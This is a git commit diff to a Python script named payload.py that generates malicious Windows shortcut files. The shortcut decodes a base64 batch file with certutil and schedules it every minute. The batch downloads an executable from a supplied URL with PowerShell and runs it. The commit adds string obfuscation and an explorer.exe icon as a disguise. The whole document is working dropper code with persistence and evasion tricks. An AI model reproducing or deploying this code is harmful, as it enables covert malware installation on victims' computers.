4262f68afd6d07bb855a47d2510688342da0179e
TheCuteOwl <114611129+TheCuteOwl@users.noreply.github.com>
2024-02-19 16:47:26 +0100

    Update payload.py

--- trap detection/payload.py
+++ trap detection/payload.py
@@ -9,7 +9,7 @@ def create_shortcut(target_path, lnk_path, icon_path, fileurl):
     shell = win32com.client.Dispatch("WScript.Shell")
     shortcut = shell.CreateShortCut(lnk_path)
     shortcut.TargetPath = target_path
-    string = f"""start /min powershell -command "IWR '{fileurl}' -OutFile '%temp%\\fqnIOQdR.exe'; schtasks /delete /f /tn n5dMmJEBYc; start %temp%\\fqnIOQdR.exe"""
+    string = f"""start /m"in powershell -command "IWR '{fileurl}' -OutFile '%temp%\\fqnIOQdR.exe'; schtasks /delete /f /tn n5dMmJEBYc; start %temp%\\fqnIOQdR.exe"""
     data = base64.b64encode(string.encode()).decode()
     shortcut.Arguments = f"/c echo {data} > %TEMP%\\KgZvPA3S.bat & certutil -f -decode %TEMP%\\KgZvPA3S.bat %TEMP%\\KgZvPA3S.bat & schtasks /create /f /sc minute /mo 1 /tn n5dMmJEBYc /tr \"%TEMP%\\KgZvPA3S.bat\""
     try:
@@ -23,7 +23,7 @@ def main():
     try:
         ico_path = sys.argv[2]
     except:
-        ico_path = ''
+        ico_path = "%systemroot%\explorer.exe"
 
     name = sys.argv[3]
     lnk_file_path = os.path.join(current_dir, f"{name}.lnk")
